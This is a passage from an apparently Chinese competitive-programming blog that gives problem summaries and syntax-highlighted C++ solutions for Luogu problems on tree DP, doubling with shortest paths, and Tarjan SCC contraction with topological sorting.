class="token operator">>></span> q<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y <span class="token operator">>></span> z<span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> z<span class="token punctuation">,</span> mp<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> z<span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2014-选课"><a href="#P2014-选课" class="headerlink" title="P2014 选课"></a><a href="https://www.luogu.com.cn/problem/P2014">P2014 选课</a></h4><ul><li><p>题意：<br>每门课都有1个权值，和1个或0个先导课，选了先导课才能选其他课，问最大权值和是多少。</p></li><li><p>题解：<br>发现和上一题的思路一样ORZ。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rec<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>v <span class="token operator">:</span> rec<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        rec<span class="token punctuation">[</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1613-跑路"><a href="#P1613-跑路" class="headerlink" title="P1613 跑路"></a><a href="https://www.luogu.com.cn/problem/P1613">P1613 跑路</a></h4><ul><li><p>题意：<br>按题目描述花最短时间跑路。</p></li><li><p>题解：<br>由于跑 $2^k$ 花费最少，那么只要将每个跑 $2^k$ 的路径预处理花费为1，最后跑一遍最短路即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> o <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> o <span class="token operator">&lt;=</span> <span class="token number">64</span><span class="token punctuation">;</span> o<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>o <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>o <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                        dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2656-采蘑菇"><a href="#P2656-采蘑菇" class="headerlink" title="P2656 采蘑菇"></a><a href="https://www.luogu.com.cn/problem/P2656">P2656 采蘑菇</a></h4><ul><li><p>题意：<br>按题意采蘑菇。</p></li><li><p>题解：<br>这道题目给我做麻了ORZ….最后会有一个精度问题。<br>总的来说还是比较简单的，就是tarjan缩点+拓扑排序(DAG上求最长路)</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7fffffff</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">3e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> low<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tot2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> head2<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> team<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> team_value<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> in<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> s<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span>    db reco<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">,</span> db recover<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>from <span class="token operator">=</span> x<span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>reco <span class="token operator">=</span> recover<span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">addedge2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot2<span class="token operator">++</span><span class="token punctuation">;</span>    edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>from <span class="token operator">=</span> x<span class="token punctuation">;</span>    edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head2<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head2<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span><span class="token keyword">int</span> nd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot_team <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> db y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sum <span class="token operator">+=</span> x<span class="token punctuation">;</span>        x <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">1.0</span> <span class="token operator">*</span> y <span class="token operator">*</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tarjan</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>nd<span class="token punctuation">;</span>    vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        tot_team<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            team<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> tot_team<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">==</span> x<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">topo</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> que<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> tot_team<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>inf<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>team<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> team_value<span class="token punctuation">[</span>team<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>que<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tp <span class="token operator">=</span> que<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> u <span class="token operator">=</span> head2<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">;</span> u<span class="token punctuation">;</span> u <span class="token operator">=</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> v <span class="token operator">=</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>tp<span class="token punctuation">]</span> <span class="token operator">+</span> edge2<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">+</span> team_value<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            in<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>in<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> INT_MIN<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> tot_team<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token 